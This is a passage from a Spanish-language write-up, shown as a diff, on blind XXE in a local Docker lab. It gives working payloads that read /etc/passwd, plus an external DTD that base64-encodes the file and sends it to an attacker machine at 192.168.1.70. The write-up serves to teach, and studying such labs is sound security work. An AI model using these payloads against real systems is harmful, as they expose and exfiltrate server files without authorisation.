@@ -349,3 +349,110 @@ Podemos apreciar que hemos recibido a nuestro servidor de burp, la petición HTT
 Y como este laboratorio solo era mostrarnos como funciona el BurpCollaborator habremos terminado este laboratorio:
 
 ![fin](/assets/images/LabsXXE/lab3/fin.png)
+
+# Prueba de laboratorio local antes del siguiente laboratorio.
+
+Primero volveremos a hacer un ejemplo que debemos entender antes que el laboratorio 4, y después seguiremos con el laboratorio 4.
+
+Volveremos a usar nuestro laboratorio que montamos en docker, una vez estemos, recordaremos que al interceptar una petición veremos algo así:
+
+![xml](/assets/images/LabsXXE/prueba/xml.png)
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+	<root>
+		<name>Dansh</name>
+		<tel>123123</tel>
+		<email>dansh@test.com</email>
+		<password>qweqwdawe12312</password>
+	</root>
+```
+
+Como recordamos, podemos ver la petición interceptada de nuestro laboratorio local, y sabemos que es vulnerable, supongamos que queremos hacer la tipica manera de inyectar en nuestro DTD una entidad y luego mostrar algo para ver si esto es vulnerable, recuerda que esto se hacia así:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+	<root>
+		<name>Dansh</name>
+		<tel>123123</tel>
+		<email>&xxe;</email>
+		<password>qweqwdawe12312</password>
+	</root>
+```
+
+En este caso si nos mostrara el archivo "/etc/passwd", pero vamos a suponer que no nos respondio nada, y solo nos mostro algun mensaje de advertencia, por ejemplo **"no se pueden inyectar entidades"**, por poner algún ejemplo, entonces como no nos esta mostrando nada ya que ninguna etiqueta se esta devolviendo, lo que podemos hacer en estos casos es lo siguiente, haremos un Out of band interaction.
+
+Y esto lo haremos a través de entidades en el DTD:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://192.168.1.70/prueba"> %xxe; ]>
+	<root>
+		<name>Dansh</name>
+		<tel>123123</tel>
+		<email>dansh@test.com</email>
+		<password>qweqwdawe12312</password>
+	</root>
+```
+> Ya no es necesario llamar a la entidad fuera del DTD ya que podría provocar errores.
+
+Vemos que hemos agregado el simbolo de porcentaje al declarar la entidad **xxe** en el DTD, y también al final llamaremos a la entidad dentro del DTD usando **%xxe;**.
+
+Lo que definimos en la entidad **xxe** es que obtendra un recurso el cual esta en este caso en nuestra maquina atacante, para acceder a el archivo llamado **prueba** el cual compartiremos desde nuestra maquina atacante através de un servidor python http compartido.
+
+Y antes de tramitar la petición debemos activar el servidor compartido en la ruta del archivo **prueba**, en este caso aún no defini el archivo prueba, por lo que al tramitar la petición, en el historial del servidor python compartido veremos lo siguiente:
+
+![listen](/assets/images/LabsXXE/prueba/listening.png)
+
+Vemos que ya esta activo, por lo que tramitaremos la petición anterior XML:
+
+![response](/assets/images/LabsXXE/prueba/response.png)
+
+Y podemos apreciar que en la respuesta del servidor web no vemos nada, pero si vamos a la terminal desde donde tenemos el servidor compartido veremos lo siguiente:
+
+![404](/assets/images/LabsXXE/prueba/404.png)
+
+y veremos este error ya que el archivo **prueba** aún no existe en nuestro servidor python compartido que ejecuta nuestra maquina atacante, pero con esto comprobamos que ya hay conexión, así que antes de repetir esta petición, lo que haremos será definir el archivo **prueba**, e indicarle en formato XML acciones maliciosas.
+
+Para ello crearemos un archivo en la ruta del servidor compartido llamado **prueba** en este caso.
+
+Y este contendrá lo siguiente:
+
+![prueba](/assets/images/LabsXXE/prueba/prueba.png)
+
+
+`<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">`
+
+En esta primera entidad que definimos llamada **file**, lo que hace es tomar el contenido del archivo **/etc/passwd**, para después convertirlo a base64, esta entidad la usaremos mas adelante, pero debe estar definida.
+
+La siguiente entidad es esta:
+
+`<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.70/?parametro=%file;'>">`
+
+Esta entidad llamada eval, lo que contiene es la definicion de otra entidad dentro de esta, pero como sabemos para declarar entidades en el DTD, se necesita usar el porcentaje, pero si lo agregamos dentro de otra entidad esto hará que el servidor se confunda al interpretar estos valores XML dandonos error, por eso debemos poner el porcentaje pero en formato hexadecimal, el cual es 25, pero debemos agregarle el &#x para que nos funcione, después esta nueva entidad se llamará **exfil**, que es lo que hará que veamos el /etc/passwd en base64 en el lado del servidor web python.
+
+Dentro de ahí le damos la ip a la que se va a conectar, para después asignar el parametro llamado **parametro** por poner un ejemplo, aunque puede ser cualquiera, y el valor de este parametro será la entidad que creamos llamada **file**, la cual como recordamos se encargara de obtener el archivo **/etc/passwd** codificado en base64, y por último llamaremos a las entidades:
+
+```
+%eval;
+%exfil;
+```
+> Primero se define la entidad eval la cual contiene la instrucción de que archivo tomará, y después se llama a la que hará ese proceso para llegar a el archivo.
+
+Y nuestro archivo final se verá así:
+
+![end](/assets/images/LabsXXE/prueba/final.png)
+
+al momento de guardar el archivo, activar el servidor http compartido en la ruta del archivo llamado **prueba** el cual contiene estas entidades, y tramitar la petición, veremos lo siguiente:
+
+![b64](/assets/images/LabsXXE/prueba/base64.png)
+
+Vemos que hemos recibido el valor del archivo **/etc/passwd** en la respuesta del parametro llamado **parametro**.
+
+por lo que solo queda decodificar el valor de base64 y vemos que se trata del archivo **/etc/passwd**:
+
+![decode](/assets/images/LabsXXE/prueba/decode.png)
+
+# Laboratorio 4: XXE Blind With Out-of-band a través de entidades de parámetros XML
+
